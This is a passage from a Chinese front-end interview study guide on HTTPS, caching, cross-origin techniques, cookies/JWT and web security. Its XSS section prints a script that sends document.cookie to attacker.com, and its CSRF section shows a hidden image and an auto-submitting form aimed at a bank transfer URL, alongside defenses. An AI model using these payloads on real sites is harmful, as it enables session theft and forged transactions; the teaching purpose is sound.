| 500 | Internal Server Error | 服务器内部错误 |
| 502 | Bad Gateway | 网关错误 |
| 503 | Service Unavailable | 服务不可用 |
| 504 | Gateway Timeout | 网关超时 |

---

## 五、HTTPS

### 5.1 HTTPS 的工作原理

HTTPS = HTTP + SSL/TLS。TLS（Transport Layer Security）在 HTTP 和 TCP 之间添加了加密层。

### 5.2 TLS 握手过程（1.2 版本）

经典的 TLS 1.2 握手需要 2 个 RTT（Round-Trip Time）：

\`\`\`
客户端                                    服务器
  |                                        |
  |-- ClientHello ------------------------>|  (1) 客户端发送支持的加密套件、随机数
  |                                        |
  |<-- ServerHello + Certificate -----------|  (2) 服务器选择加密套件、发送证书和随机数
  |                                        |
  |-- ClientKeyExchange + Finished -------->|  (3) 客户端验证证书、发送加密的预主密钥
  |                                        |
  |<-- Finished ---------------------------|  (4) 服务器解密并确认
  |                                        |
  |========== 加密通信开始 ================|
\`\`\`

**简化版过程**：
1. 客户端发送 ClientHello（支持的加密套件、TLS 版本、随机数）
2. 服务器回复 ServerHello（选择的加密套件、证书、随机数）
3. 客户端验证证书，生成预主密钥，用服务器公钥加密后发送
4. 双方使用三个随机数生成会话密钥，后续通信使用会话密钥加密

### 5.3 TLS 1.3 改进

TLS 1.3 将握手时间缩短到 1-RTT：

- 移除了不安全的加密套件和算法
- 简化了密钥交换过程
- 支持 0-RTT 恢复（之前连接过的客户端可以直接发送数据）

### 5.4 证书链验证

证书验证是一个链式信任过程：

\`\`\`
根证书（Root CA）→ 中间证书（Intermediate CA）→ 服务器证书（Server Certificate）
   |                      |                            |
   | 预装在操作系统中      | 由根证书签发               | 由中间证书签发
\`\`\`

验证步骤：
1. 浏览器检查服务器证书的域名是否匹配
2. 检查证书是否在有效期内
3. 用中间证书的公钥验证服务器证书的签名
4. 用根证书的公钥验证中间证书的签名
5. 检查证书是否被吊销（CRL/OCSP）

### 5.5 HTTP vs HTTPS 对比

| 特性 | HTTP | HTTPS |
|------|------|-------|
| 安全性 | 明文传输 | 加密传输 |
| 端口 | 80 | 443 |
| 证书 | 不需要 | 需要 CA 颁发证书 |
| 速度 | 快（无加密开销） | 较慢（有加密开销，但 TLS 1.3 已大幅优化） |
| SEO | 搜索引擎可能降低排名 | 搜索引擎优先 |
| 浏览器标识 | 不安全 | 安全锁图标 |

---

## 六、浏览器缓存

### 6.1 缓存位置

| 缓存位置 | 说明 | 生命周期 |
|---------|------|---------|
| Service Worker | 开发者控制的缓存 | 可编程控制 |
| Memory Cache | 内存缓存 | 标签页关闭时清除 |
| Disk Cache | 磁盘缓存 | 较持久 |
| Push Cache | HTTP/2 推送缓存 | 会话级别 |

### 6.2 强缓存

强缓存是指浏览器在缓存有效期内直接使用缓存，不发送请求到服务器。

**控制头**：

| 头部 | 说明 | 示例 |
|------|------|------|
| Expires（HTTP/1.0） | 绝对过期时间 | \`Expires: Wed, 21 Oct 2025 07:28:00 GMT\` |
| Cache-Control（HTTP/1.1） | 缓存控制策略 | \`Cache-Control: max-age=3600\` |

**Cache-Control 指令**：

\`\`\`
Cache-Control: max-age=3600            // 缓存 3600 秒
Cache-Control: no-cache                // 可以使用缓存，但必须向服务器验证
Cache-Control: no-store                // 完全不缓存
Cache-Control: public                  // 可被任何缓存存储
Cache-Control: private                 // 只能被浏览器缓存
Cache-Control: must-revalidate         // 过期后必须重新验证
Cache-Control: immutable               // 资源不会改变，直接使用缓存
\`\`\`

### 6.3 协商缓存

协商缓存是指浏览器发送请求到服务器，服务器判断资源是否更新，如果未更新则返回 304。

**控制头**：

| 请求头 | 响应头 | 说明 |
|--------|--------|------|
| If-Modified-Since | Last-Modified | 基于时间，精确到秒 |
| If-None-Match | ETag | 基于内容标识，更精确 |

**ETag vs Last-Modified**：
- ETag 优先级更高
- ETag 更精确（Last-Modified 只能精确到秒）
- ETag 需要服务器计算，有一定开销

### 6.4 缓存策略流程图

\`\`\`
浏览器请求资源
    |
    v
是否命中强缓存？--- 是 ---> 使用缓存（200 from cache）
    |
    否
    |
    v
发送请求到服务器
    |
    v
是否命中协商缓存？--- 是 ---> 304 Not Modified（使用缓存）
    |
    否
    |
    v
200 OK（返回新资源）
\`\`\`

### 6.5 前端缓存实践

\`\`\`html
<!-- HTML 文件：使用协商缓存 -->
<meta http-equiv="Cache-Control" content="no-cache">

<!-- CSS/JS 文件：使用强缓存 + 文件名哈希 -->
<!-- 文件名带 hash，内容变化时 hash 变化，相当于新资源 -->
<link rel="stylesheet" href="/style.abc123.css">
<script src="/app.def456.js"></script>

<!-- 图片等静态资源：使用长期强缓存 -->
<!-- Cache-Control: max-age=31536000 -->
\`\`\`

\`\`\`nginx
# Nginx 配置示例
location ~* \\.(jpg|jpeg|png|gif|ico|css|js)\$ {
    expires 1y;
    add_header Cache-Control "public, immutable";
}

location / {
    # HTML 不缓存或使用协商缓存
    add_header Cache-Control "no-cache, must-revalidate";
}
\`\`\`

---

## 七、跨域

### 7.1 什么是跨域

浏览器的**同源策略**（Same-Origin Policy）限制了不同源之间的资源访问。同源是指：协议、域名、端口号三者完全相同。

**同源示例**：
- \`http://example.com/app1\` 和 \`http://example.com/app2\` — 同源
- \`http://example.com\` 和 \`https://example.com\` — 不同源（协议不同）
- \`http://example.com\` 和 \`http://api.example.com\` — 不同源（域名不同）
- \`http://example.com:80\` 和 \`http://example.com:8080\` — 不同源（端口不同）

### 7.2 CORS（跨域资源共享）

CORS 是官方的跨域解决方案，通过服务器设置 HTTP 响应头来控制跨域访问。

**简单请求**：同时满足以下条件：
- 请求方法：GET、HEAD、POST
- 请求头：Accept、Accept-Language、Content-Language、Content-Type（仅限 application/x-www-form-urlencoded、multipart/form-data、text/plain）

\`\`\`
# 简单请求的响应头
Access-Control-Allow-Origin: https://example.com  # 或 *
Access-Control-Allow-Credentials: true              # 允许携带 Cookie
Access-Control-Expose-Headers: X-Custom-Header      # 允许前端访问的响应头
\`\`\`

**预检请求（Preflight）**：对于非简单请求，浏览器会先发送 OPTIONS 请求进行预检。

\`\`\`
# 预检请求的响应头
Access-Control-Allow-Origin: https://example.com
Access-Control-Allow-Methods: GET, POST, PUT, DELETE
Access-Control-Allow-Headers: Content-Type, Authorization
Access-Control-Max-Age: 86400  # 预检结果缓存时间（秒）
\`\`\`

### 7.3 JSONP

JSONP（JSON with Padding）利用 \`<script>\` 标签不受同源策略限制的特性。

\`\`\`javascript
// 客户端
function jsonp(url, callbackName) {
  return new Promise((resolve, reject) => {
    const script = document.createElement('script');
    const callback = 'jsonp_' + Date.now();

    window[callback] = function(data) {
      resolve(data);
      document.body.removeChild(script);
      delete window[callback];
    };

    script.src = \`\${url}?callback=\${callback}\`;
    script.onerror = () => reject(new Error('JSONP 请求失败'));
    document.body.appendChild(script);
  });
}

// 使用
jsonp('https://api.example.com/data').then(data => {
  console.log(data);
});
\`\`\`

\`\`\`javascript
// 服务端返回（Node.js 示例）
app.get('/data', (req, res) => {
  const callback = req.query.callback;
  const data = { name: '张三', age: 25 };
  res.send(\`\${callback}(\${JSON.stringify(data)})\`);
});
// 返回：jsonp_123456({"name":"张三","age":25})
\`\`\`

**JSONP 的缺点**：
- 只支持 GET 请求
- 容易受到 XSS 攻击
- 无法获取 HTTP 状态码
- 功能有限，不支持自定义请求头

### 7.4 postMessage

postMessage 允许不同源的窗口（iframe、popup）之间进行通信。

\`\`\`javascript
// 发送方（父页面）
const iframe = document.getElementById('childFrame');
iframe.contentWindow.postMessage(
  { type: 'greeting', message: 'Hello from parent' },
  'https://child.example.com' // 指定目标源
);

// 接收方（iframe 内）
window.addEventListener('message', function(event) {
  // 验证来源
  if (event.origin !== 'https://parent.example.com') return;
  console.log('收到消息:', event.data);

  // 回复消息
  event.source.postMessage(
    { type: 'reply', message: 'Hello from child' },
    event.origin
  );
});
\`\`\`

### 7.5 其他跨域方案

**Nginx 反向代理**：将不同源的请求代理到同源。

\`\`\`nginx
location /api/ {
    proxy_pass http://api.example.com/;
    # 请求 /api/users → 代理到 http://api.example.com/users
}
\`\`\`

**WebSocket**：WebSocket 不受同源策略限制。

\`\`\`javascript
const ws = new WebSocket('ws://api.example.com/ws');
// WebSocket 可以跨域通信
\`\`\`

**document.domain**：相同主域、不同子域之间可以通过设置 document.domain 进行通信（已逐渐废弃）。

---

## 八、Cookie、Session、Token、JWT

### 8.1 Cookie

Cookie 是存储在浏览器端的小型文本数据（最大 4KB）。

\`\`\`javascript
// 设置 Cookie
document.cookie = 'username=张三; max-age=3600; path=/; domain=example.com; secure; samesite=lax';

// Cookie 属性
// max-age：过期时间（秒）
// expires：过期日期（GMT 格式）
// path：Cookie 生效路径
// domain：Cookie 生效域名
// secure：仅 HTTPS 传输
// httpOnly：禁止 JavaScript 访问
// samesite：跨站请求控制（Strict/Lax/None）
\`\`\`

**Cookie 的缺点**：
- 大小限制 4KB
- 每次请求都会自动发送，浪费带宽
- 明文存储，安全性低
- 不能跨域共享

### 8.2 Session

Session 是服务器端存储的用户会话数据，通过 Cookie 中的 Session ID 关联。

\`\`\`
用户登录
    |
    v
服务器创建 Session
    |
    v
Session ID 存入 Cookie
    |
    v
后续请求携带 Cookie
    |
    v
服务器根据 Session ID 查找 Session 数据
\`\`\`

**Session 的缺点**：
- 服务器需要存储 Session 数据，增加服务器压力
- 分布式系统中需要 Session 共享（Redis 等）
- 移动端不友好（Cookie 支持有限）

### 8.3 Token

Token 是服务器签发的凭证，客户端存储并在每次请求时携带。

**Token 的特点**：
- 无状态：服务器不需要存储 Token 信息
- 可扩展：适合分布式系统和微服务架构
- 跨域友好：可以通过 Authorization 头传递
- 移动端友好：不依赖 Cookie

### 8.4 JWT（JSON Web Token）

JWT 是一种常用的 Token 实现，由三部分组成：

\`\`\`
Header.Payload.Signature

Header:  {"alg": "HS256", "typ": "JWT"}
Payload: {"sub": "123", "name": "张三", "iat": 1516239022}
Signature: HMACSHA256(base64UrlEncode(header) + "." + base64UrlEncode(payload), secret)
\`\`\`

**JWT 的使用**：

\`\`\`javascript
// 客户端存储 JWT
localStorage.setItem('token', jwtToken);

// 每次请求携带 JWT
fetch('/api/user', {
  headers: {
    'Authorization': 'Bearer ' + localStorage.getItem('token')
  }
});

// 服务端验证（Node.js）
const jwt = require('jsonwebtoken');

// 签发
const token = jwt.sign({ userId: 123 }, 'secret_key', { expiresIn: '1h' });

// 验证
try {
  const decoded = jwt.verify(token, 'secret_key');
  console.log(decoded.userId); // 123
} catch (error) {
  console.log('Token 无效或已过期');
}
\`\`\`

**JWT 的优缺点**：

| 优点 | 缺点 |
|------|------|
| 无状态，服务器不需要存储 | Token 签发后无法主动失效 |
| 跨域友好 | 一旦泄露，攻击者可以冒充用户 |
| 适合分布式系统 | Payload 是 base64 编码（非加密），不要存敏感信息 |
| 移动端友好 | Token 较大，每次请求都会携带 |

### 8.5 认证方案对比

| 方案 | 存储位置 | 服务器状态 | 适用场景 |
|------|---------|-----------|---------|
| Cookie + Session | 客户端 Cookie + 服务端 Session | 有状态 | 传统 Web 应用 |
| JWT | 客户端（localStorage/Cookie） | 无状态 | SPA、移动端、微服务 |
| OAuth 2.0 | 第三方授权 | 第三方维护 | 第三方登录 |
| SSO（单点登录） | 中心认证服务器 | 有状态 | 企业内部系统 |

---

## 九、XSS 与 CSRF 攻击

### 9.1 XSS（跨站脚本攻击）

XSS 是指攻击者将恶意脚本注入到网页中，当用户浏览该页面时，脚本会在用户浏览器中执行。

**XSS 类型**：

| 类型 | 说明 | 示例 |
|------|------|------|
| 存储型 XSS | 恶意脚本存储在服务器（如数据库） | 评论中插入脚本，所有查看评论的用户都被攻击 |
| 反射型 XSS | 恶意脚本在 URL 参数中 | 诱导用户点击恶意链接 |
| DOM 型 XSS | 前端 JS 不当操作 DOM 导致 | innerHTML 插入不可信内容 |

**XSS 攻击示例**：

\`\`\`html
<!-- 存储型 XSS：攻击者在评论中插入 -->
<script>
  // 窃取用户的 Cookie
  new Image().src = 'http://attacker.com/steal?cookie=' + document.cookie;
</script>

<!-- 反射型 XSS -->
<!-- 用户点击：http://example.com/search?q=<script>alert('XSS')</script> -->
<!-- 如果后端直接输出 q 参数到页面，脚本就会执行 -->
\`\`\`

**XSS 防御**：

\`\`\`javascript
// 1. 输出转义
function escapeHtml(str) {
  const map = {
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#x27;'
  };
  return str.replace(/[&<>"']/g, char => map[char]);
}

// 2. 使用 Content-Security-Policy（CSP）
// Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted-cdn.com

// 3. 设置 HttpOnly Cookie
// Set-Cookie: sessionId=abc123; HttpOnly; Secure

// 4. 输入验证和过滤
// 使用成熟的库如 DOMPurify 清理 HTML
import DOMPurify from 'dompurify';
const clean = DOMPurify.sanitize(dirty);

// 5. 避免使用危险的 API
// 不要使用：innerHTML、document.write、eval
// 使用：textContent、createElement
\`\`\`

### 9.2 CSRF（跨站请求伪造）

CSRF 是指攻击者诱导用户点击恶意链接，在用户不知情的情况下，以用户的身份向目标网站发送请求。

**CSRF 攻击示例**：

\`\`\`html
<!-- 攻击者网站上的恶意代码 -->
<img src="http://bank.com/transfer?to=attacker&amount=10000" width="0" height="0">

<!-- 或者自动提交表单 -->
<form action="http://bank.com/transfer" method="POST" id="csrf-form">
  <input type="hidden" name="to" value="attacker">
  <input type="hidden" name="amount" value="10000">
</form>
<script>document.getElementById('csrf-form').submit();</script>
\`\`\`

**CSRF 防御**：

\`\`\`javascript
// 1. CSRF Token（最常用）
// 服务端生成 Token 并嵌入页面
// 请求时携带 Token，服务端验证

// 前端提交时携带 Token
fetch('/api/transfer', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'X-CSRF-Token': document.querySelector('meta[name="csrf-token"]').content
  },
  body: JSON.stringify({ to: 'user2', amount: 100 })
});

// 2. SameSite Cookie
// Set-Cookie: sessionId=abc123; SameSite=Strict
// Strict: 完全禁止第三方 Cookie
// Lax: 允许 GET 请求的第三方 Cookie（导航链接）

// 3. 验证 Referer/Origin 头
// 检查请求来源是否合法

// 4. 重要操作需要二次验证（输入密码、短信验证码）
\`\`\`

### 9.3 XSS vs CSRF 对比

| 特性 | XSS | CSRF |
|------|-----|------|
| 攻击目标 | 窃取用户数据、执行恶意脚本 | 以用户身份执行非预期操作 |
| 攻击方式 | 注入脚本到页面 | 诱导用户点击恶意链接 |
| 依赖条件 | 网站存在注入漏洞 | 用户已登录目标网站 |
| 防御核心 | 输出转义、CSP | CSRF Token、SameSite Cookie |

---

## 十、从输入 URL 到页面展示的完整过程

这是前端面试的经典问题，考察候选人对浏览器工作原理的系统性理解。

### 完整流程

**1. URL 解析**

浏览器判断输入的是 URL 还是搜索关键词：
- 如果是 URL：补全协议（如自动添加 https://）
- 如果是搜索关键词：使用默认搜索引擎搜索

**2. DNS 解析**

将域名解析为 IP 地址：

\`\`\`
浏览器 DNS 缓存 → 操作系统 DNS 缓存 → 路由器 DNS 缓存 → ISP DNS 服务器 → 根域名服务器 → 顶级域名服务器 → 权威 DNS 服务器
\`\`\`

- 递归查询：客户端 → DNS 服务器，DNS 服务器负责完成整个查询
- 迭代查询：DNS 服务器返回下一级 DNS 服务器的地址，客户端继续查询

**3. TCP 连接（三次握手）**

\`\`\`
客户端                                    服务器
  |                                        |
  |-- SYN (seq=x) ------------------------>|  第一次握手
  |                                        |
  |<-- SYN-ACK (seq=y, ack=x+1) -----------|  第二次握手
  |                                        |
  |-- ACK (ack=y+1) ---------------------->|  第三次握手
  |                                        |
  |========== 连接建立 ======================|
\`\`\`

**4. TLS 握手（HTTPS）**

如果是 HTTPS，在 TCP 三次握手之后进行 TLS 握手（参见第五章）。

**5. 发送 HTTP 请求**

浏览器构建 HTTP 请求报文并发送：
- 请求行：GET /index.html HTTP/1.1
- 请求头：Host、User-Agent、Accept、Cookie 等
- 请求体（POST 等）

**6. 服务器处理请求**

服务器接收请求，经过以下处理：
- 反向代理（Nginx）接收请求
- 转发到应用服务器（Node.js、Java 等）
- 应用服务器处理业务逻辑
- 返回 HTTP 响应

**7. 浏览器接收响应**

- 检查状态码：200、301、404 等
- 处理响应头：Content-Type、Cache-Control 等
- 根据 Content-Type 决定如何处理响应体

**8. 解析 HTML，构建 DOM 树**

浏览器边下载边解析 HTML，构建 DOM 树（详见第一节）。

**9. 解析 CSS，构建 CSSOM 树**

遇到 CSS 文件时，下载并解析，构建 CSSOM 树。

**10. 构建渲染树，布局，绘制**

- 合并 DOM 和 CSSOM 构建渲染树
- 布局计算每个节点的位置和大小
- 绘制将节点转换为像素

**11. 合成和显示**

将各图层合并为最终图像，显示在屏幕上。

### 面试回答框架

**标准回答**："从输入 URL 到页面展示，主要经历以下几个阶段：

第一，URL 解析和 DNS 解析：浏览器将域名解析为 IP 地址，涉及多级缓存。

第二，建立连接：TCP 三次握手建立连接，如果是 HTTPS 还需要 TLS 握手。

第三，发送请求和接收响应：浏览器发送 HTTP 请求，服务器处理后返回响应。

第四，浏览器渲染：解析 HTML 构建 DOM 树，解析 CSS 构建 CSSOM 树，合并为渲染树，进行布局和绘制，最终合成显示。

这个过程涉及网络、操作系统、浏览器渲染引擎等多个层面的知识，其中 DNS 解析和 TCP 连接可以展开讲，浏览器渲染流程也是重点。"

---

## 十一、常见浏览器与网络面试题

### 面试题 1：浏览器渲染流程是怎样的？

从解析 HTML 构建 DOM 树开始，到解析 CSS 构建 CSSOM 树，合并为渲染树，然后进行布局（Layout）计算位置，绘制（Paint）生成像素，最后合成（Composite）显示。

### 面试题 2：什么是回流和重绘？如何优化？

回流是布局改变需要重新计算，重绘是外观改变但布局不变。优化：使用 transform 代替 top/left、批量修改 DOM、使用 DocumentFragment、缓存布局信息。

### 面试题 3：HTTP/1.1 和 HTTP/2 的区别？

HTTP/2 引入了二进制分帧、多路复用、头部压缩、服务器推送等特性，解决了 HTTP/1.1 的队头阻塞和头部冗余问题。

### 面试题 4：HTTPS 的工作原理？

HTTPS 通过 TLS 协议在 HTTP 和 TCP 之间添加加密层。TLS 握手过程中，客户端和服务器协商加密算法，交换证书和密钥，最终生成会话密钥用于加密通信。

### 面试题 5：浏览器缓存机制是怎样的？

浏览器缓存分为强缓存和协商缓存。强缓存通过 Cache-Control/Expires 控制，在有效期内直接使用缓存。协商缓存通过 ETag/Last-Modified 控制，需要向服务器验证资源是否更新。

### 面试题 6：跨域有哪些解决方案？

CORS（最常用）、JSONP（只支持 GET）、postMessage（窗口通信）、Nginx 反向代理、WebSocket。

### 面试题 7：XSS 和 CSRF 的区别和防御？

XSS 是注入恶意脚本，防御靠输出转义和 CSP。CSRF 是冒充用户执行操作，防御靠 CSRF Token 和 SameSite Cookie。

### 面试题 8：Cookie、Session、Token 的区别？

Cookie 是浏览器存储，Session 是服务器存储，Token 是无状态的凭证。JWT 是最常用的 Token 实现，适合分布式系统。

---

## 总结

浏览器原理和网络知识是前端工程师的必备基础。理解浏览器渲染流程有助于性能优化，理解 HTTP 协议有助于接口调试和架构设计，理解安全机制有助于编写安全的代码。这部分知识面试中经常以"从输入 URL 到页面展示"这类综合性问题来考察。

**核心记忆点**：
1. 渲染流程：DOM → CSSOM → Render Tree → Layout → Paint → Composite
2. 回流和重绘的优化核心是减少布局计算，使用 transform 做动画
3. HTTP/2 的核心是多路复用，HTTP/3 基于 QUIC 解决了 TCP 层面的队头阻塞
4. 强缓存用 Cache-Control，协商缓存用 ETag
5. CORS 是跨域的主流方案，JSONP 是老旧方案
6. XSS 防御靠输出转义，CSRF 防御靠 CSRF Token
7. JWT 是无状态认证方案，适合分布式系统
`
  }
];